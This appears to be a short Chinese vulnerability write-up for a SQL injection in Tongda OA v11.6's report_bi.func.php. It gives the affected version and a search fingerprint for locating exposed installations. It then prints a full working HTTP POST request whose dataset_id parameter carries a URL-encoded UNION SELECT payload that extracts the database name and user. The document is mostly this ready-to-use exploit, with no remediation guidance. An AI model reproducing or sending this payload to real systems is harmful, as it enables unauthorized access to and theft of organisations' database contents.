# 通达OA v11.6 report_bi.func.php SQL注入漏洞

## 漏洞描述

通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息

## 漏洞影响

<a-checkbox checked>通达OA v11.6 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TDXK-通达OA" </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1628302327738-ad1786e4-4b1d-42a2-b292-ff14cbb94476.png)

发送请求包执行SQL语句

```php
POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
```

![img](../../../.vuepress/public/img/1628302377105-4b5b0721-a8ab-4df9-987c-744fb145f178.png)